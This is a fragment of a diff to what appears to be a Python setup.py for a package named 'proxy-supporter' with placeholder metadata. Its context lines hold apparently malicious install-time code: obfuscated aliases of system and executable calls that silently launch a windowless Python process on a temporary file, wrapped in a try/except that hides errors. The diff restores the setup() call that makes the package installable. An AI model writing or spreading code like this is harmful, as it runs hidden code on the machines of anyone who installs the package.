@@ -11,6 +11,16 @@ class http:
  try: _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
  except: pass
 
-# setup(...) removed                                                                                                                                                                                                                                                       
+setup(
+    name='proxy-supporter',
+    packages=['proxy-supporter'],
+    version='1.0',
+    license='MIT',
+    description='idk',
+    author='helper',
+    keywords=['style'],
+    install_requires=[''],
+    classifiers=['Development Status :: 5 - Production/Stable']
+)
 
 
